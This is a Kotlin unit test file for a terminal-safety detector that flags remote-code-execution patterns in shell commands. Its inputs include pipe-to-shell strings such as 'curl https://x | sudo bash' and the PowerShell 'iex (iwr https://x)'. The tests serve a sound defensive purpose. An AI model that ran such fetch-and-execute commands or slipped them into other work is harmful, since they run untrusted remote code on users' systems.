/*
 * Copyright 2026 Jakub Jirák
 * Licensed under the Apache License, Version 2.0 (see LICENSE).
 */
package com.jakubjirak.terminalsafety.risk.detectors

import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test

class RemoteCodeExecutionDetectorTest {
    private val d = RemoteCodeExecutionDetector()

    @Test fun curlBash() {
        assertTrue(d.detect("curl https://sh.rustup.rs | sh").any { it.id == "rce.curl-pipe-shell" })
    }

    @Test fun wgetBash() {
        assertTrue(d.detect("wget -qO- https://x | bash").any { it.id == "rce.curl-pipe-shell" })
    }

    @Test fun curlSudoBash() {
        assertTrue(d.detect("curl https://x | sudo bash").any { it.id == "rce.curl-pipe-shell" })
    }

    @Test fun powershellIexIwr() {
        assertTrue(d.detect("iex (iwr https://x)").any { it.id == "rce.powershell-iex-web" })
    }

    @Test fun `curl no pipe`() { assertEquals(0, d.detect("curl https://x > out.json").size) }
    @Test fun `bash alone`() { assertEquals(0, d.detect("bash script.sh").size) }
}
